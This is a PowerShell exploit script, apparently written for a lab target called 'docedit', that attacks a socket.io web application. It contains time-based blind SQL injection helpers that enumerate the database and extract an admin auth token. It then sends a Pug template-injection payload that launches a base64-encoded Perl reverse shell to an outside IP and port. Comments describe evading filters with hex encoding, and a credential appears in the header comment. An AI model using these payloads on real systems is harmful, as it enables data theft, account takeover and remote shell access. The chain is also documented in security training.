# connect to mysql
# mysql --host=localhost --user=docedit --password=80c2680bb8b8113d57147c25bd371f2b7cffcfa22a9456d444f97ad6f92b70ce docedit
Import-Module -Name '.\PoshWebSocketClient'
#$debug=$true
$usr_email='test@test.com'
$usr_name='test'
$pass='test'
$register_user_str = "42[`"postRegister`",{`"firstName`":`"$usr_name`",`"lastName`":`"$usr_name`",`"email`":`"$usr_email`",`"password1`":`"$pass`",`"password2`":`"$pass`"}]"
$login_str = "42[`"postLogin`",{`"email`":`"$usr_email`",`"password`":`"$pass`"}]"
$save_doc_str = "42[`"saveDocument`",{{`"title`":`"<b>apples</b>`",`"content`":`"<b>apples</b>`",`"id`":`"1`",`"token`":`"{0}`"}}]"
$save_new_doc_str = "42[`"saveDocument`",{{`"title`":`"<b>apples</b>`",`"content`":`"<b>apples</b>`",`"token`":`"{0}`"}}]"

$check_email = "42[`"checkEmail`",{{`"token`":`"{0}`",`"email`":`"{1}`"}}]"
# sqli within the email field
$tag_email_str = "42[`"addTag`",{`"email`":`"{0}`",`"docid`":`"1`",`"token`":`"{1}`"}]"





$RegisterUser = @{
  SocketId = 0
  Message = $register_user_str
}
$LoginUser = @{
  SocketId = 0
  Message = $login_str
}

$SaveDoc = @{
  SocketId = 0
  Message = $save_doc_str
}


Write-Output "Initiating Connection"
Connect-Websocket -Uri "ws://docedit/socket.io/?EIO=3&transport=websocket&t=NMxgB5J&sid="
Receive-Message -SocketId 0 | out-Null
Receive-Message -SocketId 0 | Out-Null
$result = Send-Message -Message $register_user_str -SocketId 0
Write-Output "Registering User $($result.Status)"
Receive-Message -SocketId 0
#(Receive-Message -SocketId 0).Msg
$result = Send-Message -Message $login_str -SocketId 0
Write-Output "Logging In $($result.Status)"
$msg = Receive-Message -SocketId 0
$msg.msg
$json = $msg.Msg.substring(2)
$parsed_json = $json | ConvertFrom-Json
$token = $parsed_json.Token
$save_new_doc_str = $save_new_doc_str -f $token
$save_new_doc_str
$result = Send-Message -Message $save_new_doc_str -SocketId 0
Write-Output "Creating Document  $($result.Status)"
(Receive-Message -SocketId 0).Msg
(Receive-Message -SocketId 0).Msg
(Receive-Message -SocketId 0).Msg


# tag a user's email after creating a document, turns green on successful query, red on unsuccessfull query, and a secondary dialong mentioning 'Something went wrong during the queryerror during query' on sql syntax error
# searchByEmail on the user controller
# ' union select null,(select ascii(substring((select version()),1,1))=56),null,null,null,null,null,null-- 

<# Since the query always returns a statement I'm forced to use time based blind. 
' union select null,(SELECT IF((select ascii(substring((select version()),1,1))=56),(select sleep(10)), (select 'a'))),null,null,null,null,null,null-- 
#>

$strlen_sqli = "' union select null,(SELECT IF((select length(({0}))={1}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
$extract_char_sqli = "' union select null,(SELECT IF((select ascii(substring(({0}),{1},1))={2}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
$extract_count_sqli = "' union select null,( SELECT IF( (({0})={1}),SLEEP(10),'a') ),null,null,null,null,null,null;-- "
$eval_binary_stm_sqli = "' union select null,(SELECT IF( (({0})),SLEEP(10),'a') ),null,null,null,null,null,null;-- "
# add super user

# database name
# select database
# number of tables in the database
# SELECT count(*) AS TOTALNUMBEROFTABLES FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'docedit';
# number of columns in a table
# SELECT count(*) AS anyName FROM information_schema.columns WHERE table_name ='yourTableName'
# Via Timebased Blind
function Get-StringLength {
  param (
    [Parameter(Mandatory=$true)]
    [scriptblock] $SQLIScriptBlock,
    [Parameter(Mandatory=$true)]
    [scriptblock] $TransportScriptBlock,
    [Parameter(Mandatory=$true)]
    [string] $Query,
    [Parameter(Mandatory=$true)]
    [int] $MaxLength
  )
  $len = 0 
  for($i = 1; $i -le $MaxLength; ++$i) {
    $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $i,$Query
    Write-Debug $guess
    $stopwatch = [System.Diagnostics.Stopwatch]::new()
    $stopwatch.Start()
    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, -Debug
    $stopwatch.Stop()
    if($stopwatch.Elapsed.Seconds -ge 10) {
      Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
      $len = $i
      break
    }
    else { Write-Debug "$($stopwatch.Elapsed)" }
  }
  return $len
}

function Get-Count {
  param (
    [Parameter(Mandatory=$true)]
    [scriptblock] $SQLIScriptBlock,
    [Parameter(Mandatory=$true)]
    [scriptblock] $TransportScriptBlock,
    [Parameter(Mandatory=$true)]
    [string] $Query,
    [Parameter(Mandatory=$true)]
    [int] $MaxLength
  )
  $count = 0 
  for($i = 1; $i -le $MaxLength; ++$i) {
    $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $i,$Query
    Write-Debug $guess
    $stopwatch = [System.Diagnostics.Stopwatch]::new()
    $stopwatch.Start()
    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
    $stopwatch.Stop()
    if($stopwatch.Elapsed.Seconds -ge 10) {
      Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
      $count = $i
      break
    }
    else { Write-Debug "$($stopwatch.Elapsed)" }
  }
  return $count
}

function Get-String {
  param (
      [Parameter(Mandatory=$true)]
      [scriptblock] $SQLIScriptBlock,
      [Parameter(Mandatory=$true)]
      [scriptblock] $TransportScriptblock,
      [Parameter(Mandatory=$true)]
      [string] $Query,
      [Parameter(Mandatory=$true)]
      [int[]] $CharacterSet,
      [Parameter(Mandatory=$true)]
      [int] $Length
  )
  $extracted_string=""
  for($i = 1; $i -le $Length; ++$i) {
    for($j = 0; $j -lt $CharacterSet.length; ++$j) {
      #Write-Output "$($CharacterSets.versionAsciiChars[$j])"
      #$guess = $check_email -f $token, ($extract_char_sqli -f "select version()","$i","$($CharacterSets.versionAsciiChars[$j])")
      $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $Query, $i, $CharacterSet[$j]
      Write-Debug $guess
      $stopwatch = [System.Diagnostics.Stopwatch]::new()
      $stopwatch.Start()
      Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
      #(Send-Message -Message $guess -SocketId 0).Msg
      #(Receive-Message -SocketId 0).Msg | Out-Null
      $stopwatch.Stop()
      if($stopwatch.Elapsed.Seconds -ge 10) {
        $temp = [int]$CharacterSet[$j]
        Write-Debug $temp 
        $temp = [char]$temp
        Write-Debug "Char Found: $temp"
        Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
        $extracted_string += $temp
        break
      }
      else {
      # Write-Output "$($stopwatch.Elapsed)"
      }
    }
  }
  return $extracted_string
}

function Get-Query {
  param (
    [Parameter(Mandatory=$true)]
    [scriptblock] $SQLIScriptBlock,
    [Parameter(Mandatory=$true)]
    [scriptblock] $TransportScriptBlock,
    [Parameter(Mandatory=$true)]
    [string] $Query
  )
  $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $Query
  Write-Debug $guess
  $stopwatch = [System.Diagnostics.Stopwatch]::new()
  $stopwatch.Start()
  Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
  $stopwatch.Stop()
  if($stopwatch.Elapsed.Seconds -ge 10) {
    Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
    return $true
  }
  else { Write-Debug "$($stopwatch.Elapsed)" }
  return $false
}

$transport = {
  param($msg, $SocketId)
  Send-Message -Message $msg -SocketId $SocketId | Out-Null
  Receive-Message -SocketId $SocketId | Out-Null
  #Write-Debug $sendv
  #Write-Debug $recv
}

$getLength = {
  param($len,$Query)
  $check_email -f $token, ($strlen_sqli -f "$Query","$len")
}
$extractString = {
  param($query, $index, $char) 
  $check_email -f $token, ($extract_char_sqli -f "$query","$index","$char")
}
# getCount
$getCountTables = {
  param($len, $Query)
  $check_email -f $token, ($extract_count_sqli -f "$Query","$len") 
}
$getQuery = {
  param($Query) 
  $check_email -f $token, ($eval_binary_stm_sqli -f "$Query") 
}

$CharacterSets = @{
  versionAsciiChars = @(46,48,49,50,51,52,53,54,55,56,57)
  printableChars= 32..127
}
<#
# Database version enumeration
$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select version()" -MaxLength 10
Write-Output "MySQL version string length: $len"
$mySQLVersion = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select version()" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "MySQL version: $mySQLVersion"

#Current User and user priviledges enumeration
$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select current_user()" -MaxLength 20
Write-Output "Current User string length: $len"
$currentUser = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select current_user()" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "Current User: $currentUser"
$isSuperUser = Get-Query -SQLIScriptBlock $getQuery -TransportScriptBlock $transport -Query "SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='$currentUser')>1"
Write-Output "Current User: $currentUser is superuser?: $isSuperUser"

# Database schema and Tables enumeration
$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select database()" -MaxLength 10
Write-Output "Schema string length: $len"
$schema = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select database()" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "Schema Nane: $schema"
$num_tables = Get-Count -SQLIScriptBlock $getCountTables -TransportScriptBlock $transport -Query "select count(table_name) from information_schema.tables where table_schema='$schema'" -MaxLength 10
Write-Output "Number of tables in $schema is $num_tables"
$table_name_lengths = [System.Collections.ArrayList]::new()
$table_names = [System.Collections.ArrayList]::new()
for($i = 0; $i -lt $num_tables; ++$i) {
  $len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "SELECT table_name FROM information_schema.tables LIMIT $i,1" -MaxLength 30
  $table_name_lengths.Add($len)
  Write-Output "Table found with length: $len"
}
for($i = 0; $i -lt $num_tables; ++$i) {
  $table_name = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "SELECT table_name FROM information_schema.tables LIMIT $i,1" -Characterset $CharacterSets.printableChars -Length $table_name_lengths[$i]
  $table_names.Add($table_name)
  Write-Output "Found table: $table_name"
}

# do columns
#>


# get auth token
$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select token from AuthTokens where id = 1 limit 0,1" -MaxLength 40
Write-Output "AuthToken string length: $len"
$admin_auth_token = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select token from AuthTokens where id = 1 limit 0,1" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "Admin Auth Token: $admin_auth_token"

<#
one method of remove code execution is by ssti.
I got this payload from payload of all things: https://gist.githubusercontent.com/Jasemalsadi/2862619f21453e0a6ba2462f9613b49f/raw/e52a952130d102ef48b5146779249cceb3b5bf28/ssti_rev_shell_pug_node_js
#>
$ip='192.168.119.130'
$port='4443'
$b64_payload = "use Socket;`$i=`"$ip`";`$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(`"tcp`"));if(connect(S,sockaddr_in(`$p,inet_aton(`$i)))){open(STDIN,`">&S`");open(STDOUT,`">&S`");open(STDERR,`">&S`");exec(`"/bin/sh -i`");};"
$b64_payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($b64_payload))
$b64_payload
$ssti_payload =@"
42["updateSettings",{"homePage":"h1= title\r\np Welcome to #{title}\r\n\r\n#{7*7}\r\n\r\n#{spawn_sync = this.process.binding('spawn_sync')}\r\n#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}}\r\n#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}}\r\n#{payload='$b64_payload'}\r\n#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}\r\n","token":"$admin_auth_token"}]
"@
<#
More simply we can write to the file system and create an sshkey for example:
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73").exec('touch /tmp/pwned.txt')}()}
\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73 is just hex encoded child_process.
Yet another example of why blacklist input filters are extremely easy to default.
We could for example write an ssh key onti the file
#>
Send-Message -Message $ssti_payload -SocketId 0
Receive-Message -SocketId 0
Send-Message -Message '42["getHome"]' -SocketId 0
#Receive-Message -Id 0
#then visit the home page
Remove-Module PoshWebSocketClient
